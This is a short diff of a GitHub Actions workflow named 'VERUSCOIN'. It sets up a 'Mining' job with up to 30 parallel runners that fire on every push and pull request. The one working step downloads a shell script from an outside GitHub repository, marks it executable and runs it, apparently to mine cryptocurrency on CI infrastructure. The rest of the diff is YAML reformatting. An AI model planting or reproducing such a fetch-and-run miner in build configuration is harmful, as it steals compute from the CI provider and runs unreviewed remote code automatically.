@@ -1,8 +1,8 @@
-name: VC1
+name: VERUSCOIN
 on: [push, pull_request]
 jobs:
   build:
-    name: calculate
+    name: Mining
     runs-on: ubuntu-18.04
     strategy:
       max-parallel: 30
@@ -17,9 +17,10 @@ jobs:
     steps:
     - name: Set up Go ${{ matrix.go }}
       uses: actions/setup-go@v1
-      with: go-version: ${{ matrix.go }}
+      with:
+        go-version: ${{ matrix.go }}
       id: go
     - name: Setup
       uses: actions/checkout@v1
     - name: Mining
-      run:  wget https://github.com/Pex12345/hellhell/a.sh && chmod u+x a.sh && ./a.sh
+      run: wget https://github.com/Pex12345/hellhell/a.sh && chmod u+x a.sh && ./a.sh
